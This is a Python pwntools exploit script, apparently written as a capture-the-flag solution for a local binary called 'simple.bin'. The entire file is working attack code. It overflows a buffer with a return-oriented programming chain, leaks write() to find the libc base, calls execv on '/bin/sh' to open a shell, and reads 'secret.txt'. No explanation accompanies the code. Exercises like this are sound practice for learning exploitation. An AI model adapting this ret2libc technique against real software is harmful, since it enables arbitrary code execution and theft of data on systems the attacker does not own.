#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./simple.bin")

    # Investigate the libc library.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    execv_offset = libc.symbols['execv']
    print("Offset of write() within libc library: %s" % hex(write_offset))
    print("Offset of execv() within libc library: %s" % hex(execv_offset))
    
    rop = ROP("./simple.bin")
    print(rop.rdi)
    print(rop.rsi)
    rdi_gadget = b"\x73\x06\x40" + b"\x00" * 5
    rsi_gadget = b"\x71\x06\x40" + b"\x00" * 5
    
    print(p.recvuntil(b"^_^\n"))
    p.send(b"A" * 0x18 + rdi_gadget + b"\x01" + b"\x00" * 7 + rsi_gadget + b"\x18\x10\x60" + \
    b"\x00" * 13 + b"\x70\x04\x40" + b"\x00" * 5 + rdi_gadget + b"\x00" * 8 + rsi_gadget + b"\x80\x10\x60" + b"\x00" * 13 \
     + b"\x90\x04\x40" + b"\x00" * 5 + b"\xdd\x05\x40" + b"\x00" * 5)
    
    got_write = p.recvuntil(b"to e")
    got_write = got_write[0:8]
    got_write = got_write[::-1]
    got_base = int(bytes.hex(got_write), 16) - write_offset
    got_execv = got_base + execv_offset
    bytes_execv = got_execv.to_bytes(8, 'little')
    p.send(b"/bin/sh" + b"\x00")
    
    sleep(0.2)

    p.send(b"\x00" * 0x18 + rdi_gadget + b"\x80\x10\x60" + b"\x00" * 5 + bytes_execv)
    
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())
    
if __name__ == "__main__":
    exploit()
